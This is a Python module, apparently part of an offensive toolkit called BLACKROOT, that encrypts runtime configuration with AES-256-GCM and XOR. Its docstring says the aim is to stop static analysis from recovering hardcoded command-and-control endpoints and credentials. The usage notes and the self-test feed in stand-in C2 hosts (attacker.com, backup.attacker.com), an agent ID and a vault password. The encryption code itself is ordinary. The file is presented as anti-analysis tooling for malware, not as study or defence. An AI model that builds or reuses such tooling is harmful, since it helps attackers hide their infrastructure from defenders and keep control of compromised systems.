"""
config_encryptor.py - Runtime AES-256 configuration encryption
============================================================================
Encrypts configuration at deployment time and decrypts only at runtime.

Prevents static analysis from recovering hardcoded C2 endpoints, credentials,
and other configuration values from binary/source code.

Architecture:
- Config encrypted with deployment seed (BLACKROOT_DEPLOY_ID env var)
- Encrypted blob stored in ~/.blackvault/.sealed_config
- Decrypted only at process startup, stays in SecureMemoryPool
- Config values accessed through obfuscated getters

Usage:
    from config_encryptor import ConfigEncryptor
    import os
    
    # At deployment: export BLACKROOT_DEPLOY_ID=prod_seed_v1
    os.environ['BLACKROOT_DEPLOY_ID'] = 'prod_seed_v1'
    
    cfg = ConfigEncryptor()
    cfg.load_config_from_env()
    
    # Access encrypted config
    redis_url = cfg.get('redis.url')  # Decrypted on-demand
    c2_endpoint = cfg.get('c2.endpoint')
"""

import os
import json
import hashlib
from typing import Optional, Dict, Any
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
except ImportError:
    raise ImportError("cryptography package required: pip install cryptography")

import secrets
from secure_memory_pool import SecureMemoryPool, get_global_pool

try:
    from string_encryptor import StringEncryptor
    HAS_STRING_ENCRYPTOR = True
except ImportError:
    HAS_STRING_ENCRYPTOR = False


class ConfigEncryptor:
    """
    Encrypts configuration at deployment time, decrypts at runtime.
    """
    
    def __init__(self, deployment_seed: Optional[str] = None):
        """
        Initialize config encryptor.
        
        Args:
            deployment_seed: Deployment seed (or use BLACKROOT_DEPLOY_ID env var)
        """
        self.seed = deployment_seed or os.environ.get('BLACKROOT_DEPLOY_ID', 'default_seed')
        self.backend = default_backend()
        self.pool = get_global_pool()
        self._config: Dict[str, Any] = {}
        self._config_buffer_ids: Dict[str, str] = {}  # {key: buffer_id}
        
        # Initialize string encryptor if available
        if HAS_STRING_ENCRYPTOR:
            self.string_encryptor: Optional[StringEncryptor] = StringEncryptor(self.seed)  # type: ignore
        else:
            self.string_encryptor = None
    
    def _derive_key(self, salt: bytes, iterations: int = 100000) -> bytes:
        """
        Derive AES-256 key from deployment seed.
        
        Args:
            salt: Random salt
            iterations: PBKDF2 iterations
        
        Returns:
            32-byte AES-256 key
        """
        seed_bytes = self.seed.encode('utf-8')
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
            backend=self.backend
        )
        return kdf.derive(seed_bytes)
    
    def encrypt_config(self, config_dict: Dict[str, Any], output_path: Optional[str] = None) -> str:
        """
        Encrypt configuration dictionary.
        
        Args:
            config_dict: Configuration to encrypt
            output_path: Where to save encrypted blob (default: ~/.blackvault/.sealed_config)
        
        Returns:
            Path where encrypted config was saved
        
        Example:
            >>> config = {
            ...     "redis.url": "redis://localhost:6379",
            ...     "c2.endpoint": "https://attacker.com/api",
            ... }
            >>> path = encryptor.encrypt_config(config)
        """
        # Serialize config to JSON
        json_str = json.dumps(config_dict)
        plaintext = json_str.encode('utf-8')
        
        # Generate random salt and IV
        salt = secrets.token_bytes(16)
        iv = secrets.token_bytes(12)  # GCM IV
        
        # Derive key
        key = self._derive_key(salt)
        
        # Encrypt with AES-256-GCM
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=self.backend)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag
        
        # Combine: format_version (1 byte) + salt + iv + tag + ciphertext
        encrypted_blob = b'\x01' + salt + iv + tag + ciphertext
        
        # Determine output path
        if output_path is None:
            vault_path = os.path.expanduser('~/.blackvault')
            os.makedirs(vault_path, exist_ok=True)
            output_path = os.path.join(vault_path, '.sealed_config')
        
        # Write encrypted blob
        output_path = os.path.expanduser(output_path)
        with open(output_path, 'wb') as f:
            f.write(encrypted_blob)
        
        os.chmod(output_path, 0o600)  # Restrict permissions
        return output_path
    
    def decrypt_config(self, encrypted_path: Optional[str] = None) -> bool:
        """
        Decrypt configuration from encrypted blob.
        
        Args:
            encrypted_path: Path to encrypted config (default: ~/.blackvault/.sealed_config)
        
        Returns:
            True if decryption successful, False otherwise
        """
        # Determine input path
        if encrypted_path is None:
            vault_path = os.path.expanduser('~/.blackvault')
            encrypted_path = os.path.join(vault_path, '.sealed_config')
        
        encrypted_path = os.path.expanduser(encrypted_path)
        
        if not os.path.exists(encrypted_path):
            print(f"[!] Encrypted config not found: {encrypted_path}")
            return False
        
        try:
            # Read encrypted blob
            with open(encrypted_path, 'rb') as f:
                encrypted_blob = f.read()
            
            # Extract components
            version = encrypted_blob[0]
            if version != 1:
                print(f"[!] Unsupported config version: {version}")
                return False
            
            salt = encrypted_blob[1:17]
            iv = encrypted_blob[17:29]
            tag = encrypted_blob[29:45]
            ciphertext = encrypted_blob[45:]
            
            # Derive key
            key = self._derive_key(salt)
            
            # Decrypt
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=self.backend)
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Parse JSON
            json_str = plaintext.decode('utf-8')
            self._config = json.loads(json_str)
            
            # Store in secure memory pool
            for key, value in self._config.items():
                if isinstance(value, str):
                    buffer_id = self.pool.encrypt_data(value.encode('utf-8'))
                    self._config_buffer_ids[key] = buffer_id
            
            return True
        
        except Exception as e:
            print(f"[!] Failed to decrypt config: {e}")
            return False
    
    def load_config_from_env(self) -> bool:
        """
        Load encrypted config from default location (using env var seed).
        
        Returns:
            True if loaded successfully
        """
        return self.decrypt_config()
    
    def get(self, key: str, default: Optional[Any] = None) -> Optional[Any]:
        """
        Get configuration value (decrypted from secure pool).
        
        Args:
            key: Config key (dot notation: "redis.url", "c2.endpoint", etc.)
            default: Default value if key not found
        
        Returns:
            Config value or default
        
        Example:
            >>> cfg = ConfigEncryptor()
            >>> cfg.load_config_from_env()
            >>> redis_url = cfg.get("redis.url")
        """
        if key not in self._config:
            return default
        
        # If value is in secure pool (encrypted), decrypt on-demand
        if key in self._config_buffer_ids:
            buffer_id = self._config_buffer_ids[key]
            decrypted_bytes = self.pool.decrypt_data(buffer_id)
            if decrypted_bytes:
                return decrypted_bytes.decode('utf-8', errors='ignore')
        
        # Fallback to cached plaintext (if somehow available)
        return self._config.get(key, default)
    
    def get_all_config(self) -> Dict[str, Any]:
        """
        Get entire decrypted configuration (WARNING: exposes plaintext!).
        
        Use only for debugging/inspection. Prefers to return encrypted keys.
        """
        # Decrypt all values from pool
        result = {}
        for key in self._config.keys():
            result[key] = self.get(key)
        return result
    
    def get_encryptor_stats(self) -> dict:
        """Return encryptor statistics."""
        return {
            'seed': self.seed[:10] + '...' if len(self.seed) > 10 else self.seed,
            'config_keys': len(self._config),
            'encrypted_in_pool': len(self._config_buffer_ids),
            'deployment_id': os.environ.get('BLACKROOT_DEPLOY_ID', 'not_set'),
        }
    
    # String-level encryption methods (XOR-based, fast, for individual config values)
    
    def encrypt_string(self, plaintext: str) -> str:
        """
        Encrypt a single string value using XOR.
        
        Args:
            plaintext: String to encrypt
        
        Returns:
            Hex-encoded encrypted string
        
        Example:
            >>> cfg = ConfigEncryptor('my_seed')
            >>> encrypted = cfg.encrypt_string('localhost')
            >>> cfg.decrypt_string(encrypted)
            'localhost'
        """
        if not self.string_encryptor:
            raise RuntimeError("StringEncryptor not available. Install string_encryptor.py")
        return self.string_encryptor.xor_encrypt(plaintext)
    
    def decrypt_string(self, ciphertext_hex: str) -> str:
        """
        Decrypt a single string value using XOR.
        
        Args:
            ciphertext_hex: Hex-encoded encrypted string
        
        Returns:
            Decrypted plaintext
        """
        if not self.string_encryptor:
            raise RuntimeError("StringEncryptor not available. Install string_encryptor.py")
        return self.string_encryptor.xor_decrypt(ciphertext_hex)
    
    def encrypt_config_strings(self, config_dict: Dict[str, Any], keys_to_encrypt: list) -> Dict[str, Any]:
        """
        Encrypt specific string values in a config dict (non-destructive).
        
        Args:
            config_dict: Configuration dictionary
            keys_to_encrypt: List of dot-notation keys to encrypt (e.g., ["redis.host", "vault.password"])
        
        Returns:
            New dict with encrypted values at specified keys
        
        Example:
            >>> cfg = ConfigEncryptor('seed')
            >>> config = {"redis": {"host": "localhost"}, "vault": {"password": "secret"}}
            >>> encrypted = cfg.encrypt_config_strings(config, ["redis.host", "vault.password"])
            >>> encrypted["redis"]["host"]  # Now encrypted hex string
        """
        if not self.string_encryptor:
            raise RuntimeError("StringEncryptor not available. Install string_encryptor.py")
        
        # Deep copy
        result = json.loads(json.dumps(config_dict))
        
        # Encrypt specified keys
        for dot_key in keys_to_encrypt:
            parts = dot_key.split('.')
            ref = result
            
            # Navigate to parent
            for part in parts[:-1]:
                if part not in ref:
                    ref[part] = {}
                ref = ref[part]
            
            # Encrypt final key
            if parts[-1] in ref and isinstance(ref[parts[-1]], str):
                plaintext = ref[parts[-1]]
                ref[parts[-1]] = {
                    '__encrypted__': True,
                    'value': self.string_encryptor.xor_encrypt(plaintext)
                }
        
        return result
    
    def decrypt_config_strings(self, config_dict: Dict[str, Any]) -> Dict[str, Any]:
        """
        Decrypt encrypted string values in a config dict (look for __encrypted__ markers).
        
        Args:
            config_dict: Configuration with encrypted marker objects
        
        Returns:
            Config dict with decrypted strings
        """
        if not self.string_encryptor:
            raise RuntimeError("StringEncryptor not available. Install string_encryptor.py")
        
        # Deep copy
        result = json.loads(json.dumps(config_dict))
        
        # Recursively find and decrypt __encrypted__ markers
        def decrypt_recursive(obj):
            if isinstance(obj, dict):
                if obj.get('__encrypted__') and 'value' in obj:
                    if self.string_encryptor:
                        return self.string_encryptor.xor_decrypt(obj['value'])  # type: ignore
                    return obj['value']
                else:
                    return {k: decrypt_recursive(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [decrypt_recursive(item) for item in obj]
            else:
                return obj
        
        decrypted = decrypt_recursive(result)
        if isinstance(decrypted, dict):
            return decrypted
        return {}


class ConfigTemplate:
    """Helper for creating encrypted config templates."""
    
    @staticmethod
    def create_template(config_dict: Dict, output_path: str = 'config.encrypted', seed: str = ''):
        """
        Create encrypted config file from template.
        
        Args:
            config_dict: Configuration dictionary
            output_path: Where to save encrypted blob
            seed: Deployment seed (or use env var)
        """
        if not seed:
            seed = os.environ.get('BLACKROOT_DEPLOY_ID', 'template_seed')
        
        encryptor = ConfigEncryptor(deployment_seed=seed)
        path = encryptor.encrypt_config(config_dict, output_path=output_path)
        print(f"[+] Encrypted config created: {path}")
        return path


# Global config encryptor instance (TIER 2c integration point)
_global_config_encryptor = None


def get_global_config_encryptor(seed: Optional[str] = None) -> ConfigEncryptor:
    """Get or create global config encryptor."""
    global _global_config_encryptor
    if _global_config_encryptor is None:
        _global_config_encryptor = ConfigEncryptor(deployment_seed=seed)
    return _global_config_encryptor


if __name__ == '__main__':
    print("[*] Config Encryptor - Self Test")
    
    # Create test config
    test_config = {
        "redis.host": "localhost",
        "redis.port": 6379,
        "redis.url": "redis://localhost:6379",
        "c2.endpoint": "https://attacker.com/api",
        "c2.failover": "https://backup.attacker.com/api",
        "vault.password": "vault_master_key_secret",
        "agent.id": "agent_prod_001",
    }
    
    # Set deployment seed
    os.environ['BLACKROOT_DEPLOY_ID'] = 'test_seed_v1'
    
    # Test encryption
    print("[*] Testing encryption...")
    encryptor = ConfigEncryptor(deployment_seed='test_seed_v1')
    
    output_path = os.path.expanduser('~/.blackvault/.sealed_config.test')
    path = encryptor.encrypt_config(test_config, output_path=output_path)
    print(f"[+] Encrypted config: {path}")
    
    # Test decryption
    print("[*] Testing decryption...")
    encryptor2 = ConfigEncryptor(deployment_seed='test_seed_v1')
    success = encryptor2.decrypt_config(encrypted_path=output_path)
    print(f"[+] Decryption successful: {success}")
    
    # Test value retrieval
    print("[*] Testing value retrieval...")
    for key in ['redis.url', 'c2.endpoint', 'vault.password']:
        value = encryptor2.get(key)
        print(f"  {key}: {value}")
    
    # Cleanup
    os.remove(output_path)
    
    # Test stats
    stats = encryptor2.get_encryptor_stats()
    print(f"\n[*] Encryptor stats: {stats}")
    
    print("[*] All tests passed!")
